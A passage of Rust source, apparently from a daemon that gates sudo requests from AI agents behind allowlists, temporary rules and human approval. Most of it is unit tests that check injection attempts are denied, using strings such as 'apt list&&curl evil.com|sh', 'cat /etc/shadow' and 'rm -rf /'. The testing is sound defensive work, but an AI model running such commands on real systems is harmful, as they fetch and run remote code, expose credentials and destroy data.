                            stream: "stderr".to_string(),
                            data,
                            exit_code: None,
                        }).await;
                    }
                    Err(_) => break,
                }
            }
        });
    }

    drop(tx);

    while let Some(output) = rx.recv().await {
        let json = serde_json::to_string(&output)?;
        writer.write_all(json.as_bytes()).await?;
        writer.write_all(b"\n").await?;
        writer.flush().await?;
    }

    let status = child.wait().await?;
    Ok(status.code().unwrap_or(1))
}

fn is_allowed(command: &str, allowlist: &[String]) -> bool {
    // Try parsing as a command chain. If parsing fails (rejected metacharacters,
    // unterminated quotes, etc.), deny the command.
    let segments = match parse_command_chain(command) {
        Ok(s) => s,
        Err(_) => return false,
    };
    // Every sub-command must match the allowlist.
    segments.iter().all(|seg| is_single_command_allowed(&seg.command, allowlist))
}

#[cfg(test)]
mod tests {
    use super::*;

    struct MockBackend;

    #[async_trait::async_trait]
    impl crate::notification::NotificationBackend for MockBackend {
        async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
            panic!("send_and_wait should not be called when rate-limited");
        }
        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
            panic!("send_temp_rule_and_wait should not be called");
        }
        fn name(&self) -> &'static str {
            "mock"
        }
    }

    #[tokio::test]
    async fn rate_limit_sends_denial_response() {
        let dir = std::env::temp_dir().join(format!(
            "aisudo-rate-limit-test-{}",
            std::process::id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.join("test.db")).unwrap());

        // Use the real username (as resolved via SO_PEERCRED) for rate-limit records
        let user = real_test_user();

        // Insert 30 requests to exceed the rate limit
        for i in 0..30 {
            let req = SudoRequest {
                user: user.clone(),
                command: format!("cmd-{}", i),
                cwd: "/tmp".to_string(),
                pid: 1000 + i as u32,
                mode: RequestMode::Exec,
                reason: None,
                stdin: None,
                skip_nopasswd: false,
            };
            let record = SudoRequestRecord::new(req, 60);
            db.insert_request(&record).unwrap();
        }

        // Create a connected socket pair
        let (client, server) = tokio::net::UnixStream::pair().unwrap();
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);
        let db_clone = Arc::clone(&db);

        // Spawn the daemon handler
        let sudoers = Arc::new(SudoersCache::new(300));
        let handler = tokio::spawn(async move {
            handle_connection(server, db_clone, backend, sudoers, 60, &[], 10 * 1024 * 1024, 86400).await
        });

        // Client side: send a request that should be rate-limited
        let (reader, mut writer) = client.into_split();
        let request = SudoRequest {
            user: user.clone(),
            command: "should-be-rate-limited".to_string(),
            cwd: "/tmp".to_string(),
            pid: 9999,
            mode: RequestMode::Exec,
            reason: None,
            stdin: None,
            skip_nopasswd: false,
        };
        let json = serde_json::to_string(&request).unwrap();
        writer.write_all(json.as_bytes()).await.unwrap();
        writer.write_all(b"\n").await.unwrap();
        writer.flush().await.unwrap();

        // Client side: read response (with timeout to detect hangs)
        let mut buf_reader = BufReader::new(reader);
        let mut line = String::new();
        let read_result = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            buf_reader.read_line(&mut line),
        )
        .await;
        let bytes_read = read_result
            .expect("client timed out waiting for response — daemon did not send one")
            .unwrap();
        assert!(
            bytes_read > 0,
            "daemon closed connection without sending a response"
        );

        let response: SudoResponse = serde_json::from_str(line.trim()).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(
            response
                .error
                .as_deref()
                .unwrap()
                .contains("rate limit"),
            "expected 'rate limit' in error, got: {:?}",
            response.error
        );

        // Daemon handler should have returned Ok
        handler.await.unwrap().unwrap();

        // Cleanup
        std::fs::remove_dir_all(&dir).ok();
    }

    struct MockApproveBackend;

    #[async_trait::async_trait]
    impl crate::notification::NotificationBackend for MockApproveBackend {
        async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
            Ok(Decision::Approved)
        }
        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
            Ok(Decision::Approved)
        }
        fn name(&self) -> &'static str {
            "mock_approve"
        }
    }

    struct MockDenyBackend;

    #[async_trait::async_trait]
    impl crate::notification::NotificationBackend for MockDenyBackend {
        async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
            Ok(Decision::Denied)
        }
        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
            Ok(Decision::Denied)
        }
        fn name(&self) -> &'static str {
            "mock_deny"
        }
    }

    struct MockErrorBackend;

    #[async_trait::async_trait]
    impl crate::notification::NotificationBackend for MockErrorBackend {
        async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
            Err(anyhow::anyhow!("notification service down"))
        }
        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
            Err(anyhow::anyhow!("notification service down"))
        }
        fn name(&self) -> &'static str {
            "mock_error"
        }
    }

    /// Returns the username for the current process UID, matching what the daemon
    /// resolves via SO_PEERCRED when using `UnixStream::pair()`.
    fn real_test_user() -> String {
        resolve_username(nix::unistd::getuid().as_raw()).unwrap_or_else(|| "unknown".to_string())
    }

    /// Helper: send a JSON message through the socket handler and return the first response line.
    async fn send_and_receive(
        db: Arc<crate::db::Database>,
        backend: Arc<dyn crate::notification::NotificationBackend>,
        request_json: &str,
        allowlist: &[String],
        max_stdin_bytes: usize,
        max_temp_rule_duration: u32,
    ) -> String {
        let (client, server) = tokio::net::UnixStream::pair().unwrap();
        let sudoers = Arc::new(SudoersCache::new(0)); // 0 TTL so cache is always stale

        let db2 = Arc::clone(&db);
        let backend2 = Arc::clone(&backend);
        let allowlist = allowlist.to_vec();
        let handler = tokio::spawn(async move {
            handle_connection(server, db2, backend2, sudoers, 60, &allowlist, max_stdin_bytes, max_temp_rule_duration).await
        });

        let (reader, mut writer) = client.into_split();
        writer.write_all(request_json.as_bytes()).await.unwrap();
        writer.write_all(b"\n").await.unwrap();
        writer.flush().await.unwrap();
        drop(writer); // close write end so handler knows there's no more data

        let mut buf_reader = BufReader::new(reader);
        let mut line = String::new();
        tokio::time::timeout(
            std::time::Duration::from_secs(10),
            buf_reader.read_line(&mut line),
        )
        .await
        .expect("timed out waiting for response")
        .unwrap();

        let _ = handler.await;
        line.trim().to_string()
    }

    #[tokio::test]
    async fn allowlist_auto_approves_command() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);

        let request = SudoRequest {
            user: "testuser".to_string(),
            command: "apt list --installed".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: None,
            skip_nopasswd: false,
        };
        let json = serde_json::to_string(&request).unwrap();

        let resp_line = send_and_receive(
            db, backend, &json,
            &["apt list".to_string()], 10_000_000, 86400,
        ).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Approved);
    }

    #[tokio::test]
    async fn notification_approval_flow() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);

        let request = SudoRequest {
            user: "testuser".to_string(),
            command: "rm -rf /important".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: None,
            skip_nopasswd: true,
        };
        let json = serde_json::to_string(&request).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Approved);
    }

    #[tokio::test]
    async fn notification_denial_flow() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockDenyBackend);

        let request = SudoRequest {
            user: "testuser".to_string(),
            command: "rm -rf /".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: None,
            skip_nopasswd: true,
        };
        let json = serde_json::to_string(&request).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
    }

    #[tokio::test]
    async fn notification_error_results_in_denial() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockErrorBackend);

        let request = SudoRequest {
            user: "testuser".to_string(),
            command: "some-command".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: None,
            skip_nopasswd: true,
        };
        let json = serde_json::to_string(&request).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(response.error.unwrap().contains("notification"));
    }

    #[tokio::test]
    async fn stdin_too_large_is_denied() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);

        // Create a base64 payload that decodes to more than 100 bytes (our small limit)
        let large_data = vec![b'A'; 200];
        let b64 = base64::engine::general_purpose::STANDARD.encode(&large_data);

        let request = SudoRequest {
            user: "testuser".to_string(),
            command: "cat".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: Some(b64),
            skip_nopasswd: true,
        };
        let json = serde_json::to_string(&request).unwrap();

        // max_stdin_bytes = 100, so 200-byte stdin should be rejected
        let resp_line = send_and_receive(db, backend, &json, &[], 100, 86400).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(response.error.unwrap().contains("stdin exceeds size limit"));
    }

    #[tokio::test]
    async fn invalid_json_returns_error() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);

        let resp_line = send_and_receive(
            db, backend, "this is not json", &[], 10_000_000, 86400,
        ).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(response.error.is_some());
    }

    #[tokio::test]
    async fn temp_rule_request_duration_exceeds_max() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);

        let msg = aisudo_common::SocketMessage::TempRuleRequest(aisudo_common::TempRuleRequest {
            user: "testuser".to_string(),
            patterns: vec!["apt install".to_string()],
            duration_seconds: 99999,
            reason: None,
        });
        let json = serde_json::to_string(&msg).unwrap();

        // max_temp_rule_duration = 3600
        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 3600).await;

        let response: TempRuleResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(response.error.unwrap().contains("exceeds maximum"));
    }

    #[tokio::test]
    async fn temp_rule_request_empty_patterns() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);

        let msg = aisudo_common::SocketMessage::TempRuleRequest(aisudo_common::TempRuleRequest {
            user: "testuser".to_string(),
            patterns: vec![],
            duration_seconds: 3600,
            reason: None,
        });
        let json = serde_json::to_string(&msg).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: TempRuleResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(response.error.unwrap().contains("no patterns"));
    }

    #[tokio::test]
    async fn temp_rule_request_approved_flow() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);

        let msg = aisudo_common::SocketMessage::TempRuleRequest(aisudo_common::TempRuleRequest {
            user: "testuser".to_string(),
            patterns: vec!["apt install".to_string(), "apt list".to_string()],
            duration_seconds: 3600,
            reason: Some("need to install deps".to_string()),
        });
        let json = serde_json::to_string(&msg).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: TempRuleResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Approved);
        assert!(response.expires_at.is_some());
    }

    #[tokio::test]
    async fn list_rules_returns_allowlist_and_temp_rules() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);

        // Use real username (daemon overrides via SO_PEERCRED)
        let user = real_test_user();

        // Add an active temp rule for the real user
        let now = chrono::Utc::now();
        let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
        let patterns = serde_json::to_string(&vec!["docker ps"]).unwrap();
        db.insert_temp_rule("r1", &user, &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();

        let msg = aisudo_common::SocketMessage::ListRules(aisudo_common::ListRulesRequest {
            user: user.clone(),
        });
        let json = serde_json::to_string(&msg).unwrap();

        let resp_line = send_and_receive(
            db, backend, &json,
            &["apt list".to_string()], 10_000_000, 86400,
        ).await;

        let response: aisudo_common::ListRulesResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.allowlist, vec!["apt list"]);
        assert_eq!(response.temp_rules.len(), 1);
        assert_eq!(response.temp_rules[0].patterns, vec!["docker ps"]);
    }

    #[tokio::test]
    async fn temp_rule_auto_approves_matching_command() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);

        // Use the real username (as resolved via SO_PEERCRED)
        let user = real_test_user();

        // Create an active temp rule for the real user
        let now = chrono::Utc::now();
        let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
        let patterns = serde_json::to_string(&vec!["apt install"]).unwrap();
        db.insert_temp_rule("r1", &user, &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();

        let request = SudoRequest {
            user: user.clone(),
            command: "apt install vim".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: None,
            skip_nopasswd: false,
        };
        let json = serde_json::to_string(&request).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Approved);
    }

    #[test]
    fn is_allowed_matches_exact_or_space_separated() {
        assert!(is_allowed("apt list --installed", &["apt list".to_string()]));
        assert!(is_allowed("apt list", &["apt list".to_string()]));
        assert!(!is_allowed("apt remove vim", &["apt list".to_string()]));
        assert!(!is_allowed("rm -rf /", &["apt list".to_string()]));

        // Shell injection attempts must be blocked
        assert!(!is_allowed("apt list;cat /etc/shadow", &["apt list".to_string()]));
        assert!(!is_allowed("apt list&&curl evil.com|sh", &["apt list".to_string()]));
        assert!(!is_allowed("apt list$(rm -rf /)", &["apt list".to_string()]));
        assert!(!is_allowed("apt list\tremoved", &["apt list".to_string()]));
        assert!(!is_allowed("apt listed", &["apt list".to_string()]));
    }

    #[test]
    fn is_allowed_empty_allowlist() {
        assert!(!is_allowed("anything", &[]));
    }

    #[test]
    fn is_allowed_multiple_patterns() {
        let allowlist = vec![
            "apt list".to_string(),
            "systemctl status".to_string(),
        ];
        assert!(is_allowed("apt list", &allowlist));
        assert!(is_allowed("systemctl status nginx", &allowlist));
        assert!(!is_allowed("systemctl restart nginx", &allowlist));
    }

    #[test]
    fn temp_rule_prefix_matching() {
        let dir = std::env::temp_dir().join(format!(
            "aisudo-temp-rule-test-{}",
            std::process::id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let db = crate::db::Database::open(&dir.join("test.db")).unwrap();

        let now = chrono::Utc::now();
        let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
        let patterns = serde_json::to_string(&vec!["apt install", "apt list"]).unwrap();

        db.insert_temp_rule("r1", "alice", &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();

        // Exact match and space-separated args
        assert!(is_temp_rule_allowed(&db, "alice", "apt install vim").unwrap());
        assert!(is_temp_rule_allowed(&db, "alice", "apt install").unwrap());
        assert!(is_temp_rule_allowed(&db, "alice", "apt list --installed").unwrap());
        assert!(is_temp_rule_allowed(&db, "alice", "apt list").unwrap());

        // No match
        assert!(!is_temp_rule_allowed(&db, "alice", "apt remove vim").unwrap());
        assert!(!is_temp_rule_allowed(&db, "alice", "rm -rf /").unwrap());

        // Shell injection attempts must be blocked
        assert!(!is_temp_rule_allowed(&db, "alice", "apt install;rm -rf /").unwrap());
        assert!(!is_temp_rule_allowed(&db, "alice", "apt list&&curl evil.com").unwrap());
        assert!(!is_temp_rule_allowed(&db, "alice", "apt list$(whoami)").unwrap());

        // Wrong user
        assert!(!is_temp_rule_allowed(&db, "bob", "apt install vim").unwrap());

        std::fs::remove_dir_all(&dir).ok();
    }

    // ===== parse_command_chain tests =====

    #[test]
    fn parse_single_command() {
        let result = parse_command_chain("apt list").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].command, "apt list");
        assert_eq!(result[0].op, ChainOp::First);
    }

    #[test]
    fn parse_semicolon_chain() {
        let result = parse_command_chain("apt list ; dpkg -l").unwrap();
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].command, "apt list");
        assert_eq!(result[0].op, ChainOp::First);
        assert_eq!(result[1].command, "dpkg -l");
        assert_eq!(result[1].op, ChainOp::Semi);
    }

    #[test]
    fn parse_pipe_chain() {
        let result = parse_command_chain("apt list | grep vim").unwrap();
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].command, "apt list");
        assert_eq!(result[0].op, ChainOp::First);
        assert_eq!(result[1].command, "grep vim");
        assert_eq!(result[1].op, ChainOp::Pipe);
    }

    #[test]
    fn parse_and_or_chain() {
        let result = parse_command_chain("apt list && echo ok || echo fail").unwrap();
        assert_eq!(result.len(), 3);
        assert_eq!(result[0].command, "apt list");
        assert_eq!(result[0].op, ChainOp::First);
        assert_eq!(result[1].command, "echo ok");
        assert_eq!(result[1].op, ChainOp::And);
        assert_eq!(result[2].command, "echo fail");
        assert_eq!(result[2].op, ChainOp::Or);
    }

    #[test]
    fn parse_semicolon_inside_double_quotes() {
        let result = parse_command_chain(r#"echo "hello; world""#).unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].command, r#"echo "hello; world""#);
    }

    #[test]
    fn parse_operators_inside_single_quotes() {
        let result = parse_command_chain("echo 'a && b'").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].command, "echo 'a && b'");
    }

    #[test]
    fn parse_pipe_inside_double_quotes() {
        let result = parse_command_chain(r#"echo "a | b""#).unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].command, r#"echo "a | b""#);
    }

    #[test]
    fn parse_rejects_dollar_sign() {
        let err = parse_command_chain("apt list$(rm -rf /)").unwrap_err();
        assert!(err.contains("$"), "error should mention $: {err}");
    }

    #[test]
    fn parse_rejects_redirect() {
        let err = parse_command_chain("apt list > /tmp/out").unwrap_err();
        assert!(err.contains(">"), "error should mention >: {err}");
    }

    #[test]
    fn parse_rejects_input_redirect() {
        let err = parse_command_chain("cat < /etc/passwd").unwrap_err();
        assert!(err.contains("<"), "error should mention <: {err}");
    }

    #[test]
    fn parse_rejects_bare_ampersand() {
        let err = parse_command_chain("apt list & echo bg").unwrap_err();
        assert!(err.contains("&"), "error should mention &: {err}");
    }

    #[test]
    fn parse_rejects_backtick() {
        let err = parse_command_chain("apt list `whoami`").unwrap_err();
        assert!(err.contains("`"), "error should mention backtick: {err}");
    }

    #[test]
    fn parse_rejects_subshell() {
        let err = parse_command_chain("(apt list)").unwrap_err();
        assert!(err.contains("("), "error should mention (: {err}");
    }

    #[test]
    fn parse_rejects_newline() {
        let err = parse_command_chain("apt list\nrm -rf /").unwrap_err();
        assert!(err.contains("newline"), "error should mention newline: {err}");
    }

    #[test]
    fn parse_dollar_inside_single_quotes_is_ok() {
        // Single quotes suppress metacharacter detection
        let result = parse_command_chain("echo '$HOME'").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].command, "echo '$HOME'");
    }

    #[test]
    fn parse_dollar_inside_double_quotes_is_ok() {
        // $ inside double quotes is treated as literal since we exec directly
        // without a shell — no variable expansion happens.
        let result = parse_command_chain(r#"echo "$HOME""#).unwrap();
        assert_eq!(result.len(), 1);
    }

    #[test]
    fn parse_backslash_escape_in_double_quotes() {
        let result = parse_command_chain(r#"echo "hello\"world""#).unwrap();
        assert_eq!(result.len(), 1);
    }

    #[test]
    fn parse_empty_command_error() {
        assert!(parse_command_chain("").is_err());
        assert!(parse_command_chain("   ").is_err());
    }

    #[test]
    fn parse_trailing_operator_error() {
        assert!(parse_command_chain("apt list ;").is_err());
        assert!(parse_command_chain("apt list &&").is_err());
        assert!(parse_command_chain("apt list |").is_err());
    }

    #[test]
    fn parse_unterminated_quote_error() {
        assert!(parse_command_chain("echo 'hello").is_err());
        assert!(parse_command_chain(r#"echo "hello"#).is_err());
    }

    #[test]
    fn parse_multi_pipe_chain() {
        let result = parse_command_chain("cat /etc/hosts | grep local | wc -l").unwrap();
        assert_eq!(result.len(), 3);
        assert_eq!(result[0].op, ChainOp::First);
        assert_eq!(result[1].op, ChainOp::Pipe);
        assert_eq!(result[2].op, ChainOp::Pipe);
    }

    #[test]
    fn parse_mixed_operators() {
        let result = parse_command_chain("apt update ; apt list | grep vim && echo done").unwrap();
        assert_eq!(result.len(), 4);
        assert_eq!(result[0].command, "apt update");
        assert_eq!(result[0].op, ChainOp::First);
        assert_eq!(result[1].command, "apt list");
        assert_eq!(result[1].op, ChainOp::Semi);
        assert_eq!(result[2].command, "grep vim");
        assert_eq!(result[2].op, ChainOp::Pipe);
        assert_eq!(result[3].command, "echo done");
        assert_eq!(result[3].op, ChainOp::And);
    }

    // ===== is_allowed with chains =====

    #[test]
    fn is_allowed_pipe_chain_all_allowed() {
        let allowlist = vec!["apt list".to_string(), "grep".to_string()];
        assert!(is_allowed("apt list | grep vim", &allowlist));
    }

    #[test]
    fn is_allowed_pipe_chain_one_denied() {
        let allowlist = vec!["apt list".to_string()];
        assert!(!is_allowed("apt list | rm -rf /", &allowlist));
    }

    #[test]
    fn is_allowed_semicolon_chain_all_allowed() {
        let allowlist = vec!["apt list".to_string(), "dpkg -l".to_string()];
        assert!(is_allowed("apt list ; dpkg -l", &allowlist));
    }

    #[test]
    fn is_allowed_semicolon_chain_one_denied() {
        let allowlist = vec!["apt list".to_string()];
        assert!(!is_allowed("apt list ; rm -rf /", &allowlist));
    }

    #[test]
    fn is_allowed_and_chain() {
        let allowlist = vec!["apt list".to_string(), "echo".to_string()];
        assert!(is_allowed("apt list && echo ok", &allowlist));
    }

    #[test]
    fn is_allowed_or_chain() {
        let allowlist = vec!["apt list".to_string(), "echo".to_string()];
        assert!(is_allowed("apt list || echo fail", &allowlist));
    }

    #[test]
    fn is_allowed_rejects_dangerous_metacharacters() {
        let allowlist = vec!["apt list".to_string()];
        // $ is rejected by the parser
        assert!(!is_allowed("apt list$(rm -rf /)", &allowlist));
        // > is rejected by the parser
        assert!(!is_allowed("apt list > /tmp/out", &allowlist));
        // backtick is rejected
        assert!(!is_allowed("apt list `whoami`", &allowlist));
    }

    // ===== is_temp_rule_allowed with chains =====

    #[test]
    fn temp_rule_pipe_chain_all_allowed() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = crate::db::Database::open(&dir.path().join("test.db")).unwrap();
        let now = chrono::Utc::now();
        let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
        let patterns = serde_json::to_string(&vec!["apt list", "grep"]).unwrap();
        db.insert_temp_rule("r1", "alice", &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();

        assert!(is_temp_rule_allowed(&db, "alice", "apt list | grep vim").unwrap());
    }

    #[test]
    fn temp_rule_pipe_chain_one_denied() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = crate::db::Database::open(&dir.path().join("test.db")).unwrap();
        let now = chrono::Utc::now();
        let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
        let patterns = serde_json::to_string(&vec!["apt list"]).unwrap();
        db.insert_temp_rule("r1", "alice", &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();

        assert!(!is_temp_rule_allowed(&db, "alice", "apt list | rm -rf /").unwrap());
    }

    #[test]
    fn temp_rule_semicolon_chain_all_allowed() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = crate::db::Database::open(&dir.path().join("test.db")).unwrap();
        let now = chrono::Utc::now();
        let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
        let patterns = serde_json::to_string(&vec!["apt list", "dpkg -l"]).unwrap();
        db.insert_temp_rule("r1", "alice", &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();

        assert!(is_temp_rule_allowed(&db, "alice", "apt list ; dpkg -l").unwrap());
    }

    // ===== split_command_argv tests =====

    #[test]
    fn split_argv_simple() {
        let result = split_command_argv("apt list --installed").unwrap();
        assert_eq!(result, vec!["apt", "list", "--installed"]);
    }

    #[test]
    fn split_argv_single_quotes() {
        let result = split_command_argv("echo 'hello world'").unwrap();
        assert_eq!(result, vec!["echo", "hello world"]);
    }

    #[test]
    fn split_argv_double_quotes() {
        let result = split_command_argv(r#"echo "hello world""#).unwrap();
        assert_eq!(result, vec!["echo", "hello world"]);
    }

    #[test]
    fn split_argv_escape_in_double_quotes() {
        let result = split_command_argv(r#"echo "hello\"world""#).unwrap();
        assert_eq!(result, vec!["echo", r#"hello"world"#]);
    }

    #[test]
    fn split_argv_empty() {
        assert!(split_command_argv("").is_err());
        assert!(split_command_argv("   ").is_err());
    }
}

fn set_socket_permissions(path: &Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;
    let perms = std::fs::Permissions::from_mode(0o660);
    std::fs::set_permissions(path, perms)?;

    // Set group to 'aisudo' so members of that group can connect
    if let Some(group) = nix::unistd::Group::from_name("aisudo")? {
        nix::unistd::chown(path, None, Some(group.gid))?;
    }

    Ok(())
}
